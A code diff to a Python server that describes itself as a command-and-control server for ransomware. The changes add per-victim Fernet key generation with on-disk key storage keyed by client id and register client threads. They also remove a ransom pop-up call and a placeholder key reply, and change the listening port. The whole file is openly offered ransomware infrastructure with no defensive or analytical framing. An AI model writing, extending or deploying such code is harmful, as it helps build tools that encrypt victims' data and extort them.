@@ -4,34 +4,36 @@ C&C server for communication with the ransomware on local machine
 import socket, select
 import sys
 from threading import Thread
+from cryptography.fernet import Fernet
+import os
 
-sys.path.insert(0, 'crypto/')   
-import interface
 
 class ClientThread(Thread):
 
-    def __init__(self, host, port, conn) -> None:
+    def __init__(self, host: str, port: int, conn: socket) -> None:
         Thread.__init__(self)
         self.host = host
         self.port = port
         self.conn = conn
+        self.id = None
 
-    def run(self):
+    def run(self) -> None:
         while True:
-            #open the ransomware window when the client connects
-            interface.pop_up_win()
-            print("ransomware payment received:", interface.payment)
             
             data = self.conn.recv(2048)
+
+            if self.id == None:
+                self.id = data
+
             if not data: break
             
-            print(f"recieved data: {data}")
+            print(f"recieved user connectinon: {data}")
+            self.conn.send(b"XD")
 
-            self.conn.send(b"Here is encryption key: XXXXXX")
 
 
 class Server():
-    def __init__(self, host, port) -> None:
+    def __init__(self, host: str, port: int) -> None:
         self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.ss.bind((host, port))
@@ -40,8 +42,15 @@ class Server():
         self.port = port
         self.threads = []
 
+
+    def keyGen(self, id: str) -> bytes:
+        key = Fernet.generate_key()
+        with open(os.path.join("Users", id), 'wb') as gotUser:
+            gotUser.write(key)
+
+        return key
         
-    def start(self):
+    def start(self) -> None:
         r_socks, w_socks, e_socks = select.select([self.ss], [], [])
         while True:
             print("waiting")
@@ -49,11 +58,12 @@ class Server():
                 (conn, (self.host, self.port)) = self.ss.accept()
                 new_thread = ClientThread(self.host, self.port, conn)
                 new_thread.start()
-            
+                self.threads.append(new_thread)
+
 
 if __name__ == "__main__":
 
-    s = Server("127.0.0.1", 5789)
+    s = Server("127.0.0.1", 6677)
     s.start()
     
     sys.exit()
